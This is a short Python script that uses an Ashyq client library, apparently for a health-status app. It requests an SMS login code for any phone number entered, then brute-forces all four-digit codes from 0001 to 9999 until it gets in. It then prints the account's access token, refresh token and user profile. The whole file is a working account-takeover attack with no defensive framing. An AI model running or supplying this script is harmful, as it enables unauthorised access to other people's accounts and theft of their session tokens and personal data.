from ashyq import Ashyq, exceptions


# Init class and set phone number
phone_number = input('Input phone number: ')
ashyq = Ashyq(phone_number)


# SMS (login) request
ashyq.new_install()


i = 1

while i <= 9999:
    code = '{:04}'.format(i)

    try:
        # Join by received SMS
        ashyq.connect(code)

        # If succesfully logged_on
        break

    except exceptions.AshyqException:
        print('Passed {}'.format(code))
        i += 1


if ashyq.logged_on:
    print(ashyq.access_token, ashyq.refresh_token)
    print(ashyq.user)
